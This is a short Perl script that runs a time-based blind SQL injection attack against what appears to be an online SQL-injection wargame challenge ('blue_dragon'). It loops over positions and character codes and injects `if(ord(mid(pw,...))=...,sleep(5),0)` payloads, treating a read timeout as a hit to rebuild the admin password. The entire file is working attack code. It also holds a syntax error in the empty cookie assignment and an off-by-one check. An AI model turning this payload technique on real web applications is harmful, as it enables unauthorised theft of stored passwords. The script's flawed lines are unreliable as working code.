#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;

$ENV{PERL_LWP_SSL_CA_FILE} = '/etc/ssl/cert.pem';

#### CONFIG ##################################################################
my $TIMEOUT = 5;

my @CHARSET = (
  #33  ..  47,  # !"#$%&'()*+,-./
  48  ..  57,  # 0-9
  #58  ..  64,  # :;<=>?@
  #65  ..  70,  # A-F
  #97  ..  102, # a-f
  #65  ..  90,  # A-Z
  #91  ..  96,  # [\]^_`
  97  ..  122, # a-z
  #123 ..  126, # {|}~
);

my $URL =
"https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
;

my $COOKIE =
;
##############################################################################

my $UA = LWP::UserAgent->new( timeout => $TIMEOUT );
my $found;
for my $POS (1 .. 8) {
    my $i = 0;

    for my $ORD (@CHARSET) {
        $i++;

        my $PAYLOAD =
        "?id=admin%27%26%26if(ord(mid(pw,$POS,1))=$ORD,sleep(5),0)%23"
        ;

RETRY:
        my $RESP = $UA->get( $URL.$PAYLOAD, 'Cookie' => $COOKIE );

        if ($RESP->is_error) {
            printf "[%d] %s\n", $RESP->code, $RESP->message;

            if ($RESP->code == 500 && $RESP->message eq 'read timeout') {
                $found .= chr $ORD;
                print "$POS => $ORD, Total: '$found'\n";
                last;
            } else {
                goto RETRY;
            }
        } else {
            if ($i == $#CHARSET) { # last char and not found
                $found .= chr 219;
            }
        }
    }
}

# vim:sw=4:ts=4:sts=4:et:cc=80
# End of file
